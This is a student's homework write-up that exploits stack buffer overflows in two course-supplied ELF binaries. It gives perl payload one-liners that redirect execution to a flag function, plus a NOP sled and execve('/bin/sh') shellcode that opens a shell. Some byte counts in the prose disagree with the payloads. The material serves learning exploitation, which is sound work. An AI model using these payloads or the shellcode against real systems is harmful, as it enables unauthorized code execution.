# Tema 4 IOCLA - Exploit ELFs

## Necula Alexandru - 322CD

For solving this homework, I used Ghidra, objdump and gdb with ASLR disabled.

### Task 1

Firstly, we create a new project in Ghidra and import the `nice` binary.

We can see there are multiple functions in `main` that read from stdin and put
the values on the stack. We check each function to see if there's any buffer
overflow.

- FUN_080492de - reads 228 bytes (stack reserved: 257 bytes)
- FUN_080492f8 - reads 153 bytes (stack reserved: 238 bytes)
- FUN_08049312 - reads 70 bytes (stack reserved: 138 bytes)
- FUN_08049329 - reads 489 bytes (stack reserved: 469 bytes) - buffer overflow
- FUN_0804934f - reads 435 bytes (stack reserved: 466 bytes)

Therefore, FUN_08049329 is the vulnerable function and its address is
`0x8049329`. The function is vulnerable because it goes beyond the
allocated stack space and causes buffer overflow (also seg fault in our case).

### Task 2

We want our payload to override the called function's address and change it to
`print_flag` function's address (which is `0x8049291`).

We will fill the buffer with random characters until we reach our desired
address. We need 228 + 153 + 70 + 469 = 920 bytes until we reach EBP. We want to
override the value at EBP + 16, so our payload will consist of 936 random
characters followed by `print_flag` function's address.
Our machine is little-endian, so we need the bytes stored in reverse order.

Finally, our payload structure is:

- 936 bytes of 'a'
- 4 bytes of print_flag's address

The command we use to generate the payload is:
`perl -e 'print "a"x936 . "\x91\x92\x04\x08"' > nice_payload`

Then, we run our program with the command:
`./nice < nice_payload`

The output is:
NICE_FLAG{c567ef739de49df0d33d79af50823bf2}

### Task 3

Firstly, we create a new project in Ghidra and import the `naughty` binary.

We can see there are multiple functions in `main` that read from stdin and put
the values on the stack. However, there are additional checks compared
to the `nice` binary.

- FUN_080492de - reads 46 bytes (stack reserved: 340 bytes)
               - also checks that value at EBP-324 is `0xc5f98e2`
- FUN_08049308 - reads 100 bytes (stack reserved: 339 bytes)
               - also checks that value at EBP-337 is `0x745d2326`
- FUN_08049332 - reads 465 bytes (stack reserved: 445 bytes)
               - also checks that value at EBP-9 is `0xe5bdd632`
               - generates buffer overflow

Therefore, FUN_08049332 is the vulnerable function and its address is
`0x8049332`. We have to override the address of the function that is called
at EBP + 16 to `print_flag` function's address (`0x8049291`).

We have to generate our payload according to the above restrictions and
putting the required values in reverse order (little-endian).

For the first function, we need 16 random chars, followed by `0xc5f98e2`
(in little endian format), and another 26 random chars (16 + 4 + 26 = 46).
To cover the second function, we need 2 random chars, followed by `0x745d2326`,
and another 94 random chars (2 + 4 + 94 = 100).
To cover the third and vulnerable function, we need 436 random chars, followed
by `0xe5bdd632` and another 21 random chars to reach EBP + 16.
(436 + 4 + 21 = 445 + 16 = 461)
Then, append `print_flag` function's address (`0x8049291`).

Finally, the structure of our payload is:

- 16 bytes of 'a'
- required address for verification
- 28 bytes of 'a'
- required address for verification
- 530 bytes of 'a'
- required address for verification
- 21 bytes of 'a'
- 4 bytes of print_flag's address

The command we use to generate the payload is:
`perl -e 'print "a"x16 . "\xe2\x98\x5f\x0c" . "a"x28 . "\x26\x23\x5d\x74" . "a"x530 . "\x32\xd6\xbd\xe5" . "a"x21 . "\x91\x92\x04\x08"' > naughty_payload`

Then, we run our program with the command:
`./naughty < naughty_payload`

The output is:
NAUGHTY_FLAG{d96efc568f1da85b7fbe50e9c7d35fd7}

### Task 4

For opening a shell we first generate a shellcode to inject
(check shellcode.asm), then we compile it and use objdump to get the bytes.

We know the place to insert our shellcode from Task 3.
Firstly, we need to get the address of EBP in our vulnerable function using gdb.
Because ASLR is disabled, it won't change after multiple runs.

Similarly to Task 3, the structure of our payload is:

For the first function, we need 16 random chars, followed by `0xc5f98e2`
(in little endian format), and another 26 random chars (16 + 4 + 26 = 46).
To cover the second function, we need 2 random chars, followed by `0x745d2326`,
and another 94 random chars (2 + 4 + 94 = 100).

The length of our shellcode is 25 bytes.
Instead of 436 random chars, we will add 411 NOP instructions, followed by
our shellcode (411 + 25 = 436). Then we have to add the checked variable,
`0xe5bdd632` and another 21 random chars to reach EBP + 16, where we will put
an address pointing somewhere in the middle of our NOP sequence.

The buffer for our third function has 445 reserved bytes.

For finding the address of EBP using gdb, we run the commands
`gdb ./naughty`
`break *print_flag+0xa4`
`run < naughty_payload`
`print $ebp - 0x1bd` - get the beginning of our buffer

We get the address `0xffffce93` and we will make the processor jump somewhere
in the middle of our NOP sequence (let's add 200), so we get
the address `0xffffcf5b`.

Finally, our payload structure is:

- Initial buffer to pass the first and second functions (see task 3)
- 411 bytes of NOP
- 25 bytes of shellcode
- 4 bytes of required variable
- 21 bytes of 'a'
- return address in middle of NOP sequence

The command we use to generate our payload is:

`perl -e 'print "a"x16 . "\xe2\x98\x5f\x0c" . "a"x28 . "\x26\x23\x5d\x74" . "a"x94 . "\x90"x411 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x32\xd6\xbd\xe5" . "a"x21 . "\x5b\xcf\xff\xff"' > naughty_shellcode`

Then, we run our program with the command:
`./naughty < naughty_shellcode`

Because the return address varies, we might get "Segmentation fault".

Reference:
<https://dhavalkapil.com/blogs/Shellcode-Injection/>
